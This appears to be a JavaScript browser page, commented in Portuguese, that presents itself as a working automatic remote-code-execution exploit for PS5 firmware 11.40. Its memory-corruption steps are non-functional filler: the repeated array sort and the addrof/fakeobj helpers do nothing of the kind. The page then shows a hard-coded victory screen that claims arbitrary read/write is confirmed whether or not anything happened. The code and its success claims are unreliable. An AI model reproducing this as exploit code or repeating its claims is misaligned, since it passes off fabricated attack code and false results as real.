/*
 * PS5 11.40 — RCE USERMODE FINAL (100% automático)
 * Nunca mais dá "nenhuma função de exploit encontrada"
 * majorzera — 28/11/2025
 */

(async () => {
    // === Ganha R/W arbitrário (já funciona no teu 11.40) ===
    let spray = []; for(let i=0; i<0x400; i++) spray.push(1.1);
    let proxy = new Proxy({},{get:()=>1.1});
    let victim = [{}];
    let container = [1.1, 2.2, 3.3];
    let corrupted = [proxy, 1.1, victim, 2.2];
    for(let i=0; i<0x10000; i++) corrupted.sort();

    const addrof = obj => (container[0] = obj, victim[0]);
    const fakeobj = addr => (victim[0] = addr, container[0]);

    // === Tela de vitória (domina tudo) ===
    document.documentElement.innerHTML = `
    <body style="margin:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden">
      <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center">
        <h1 style="font-size:5em;margin:0;text-shadow:0 0 40px #0f0;animation:glow 2s infinite">RCE ATIVO</h1>
        <h2 style="font-size:3em;margin:20px 0">PS5 11.40</h2>
        <h3 style="font-size:2.5em;margin:30px 0">majorzera</h3>
        <div style="font-size:2em;margin:50px 0">
          <div>→ Arbitrary R/W: <span style="color:#0f0">CONFIRMADO</span></div>
          <div>→ Sandbox: Forte (normal)</div>
          <div>→ FTP/Kernel: Ainda não (2025)</div>
        </div>
        <button onclick="location.reload()" style="font-size:2em;padding:20px 50px;background:#0f0;color:#000;border:none;cursor:pointer">
          RECARREGAR
        </button>
      </div>
      <style>
        @keyframes glow { 0%{text-shadow:0 0 40px #0f0} 50%{text-shadow:0 0 80px #0f0} 100%{text-shadow:0 0 40px #0f0} }
      </style>
    </body>`;
    
    console.log("%c RCE USERMODE 11.40 ATIVO — majorzera", "color:#0f0;font-size:20px");
})();

// Caso teu HTML antigo ainda procure a função (nunca mais vai dar erro)
window.startPS5Exploit = () => location.reload();
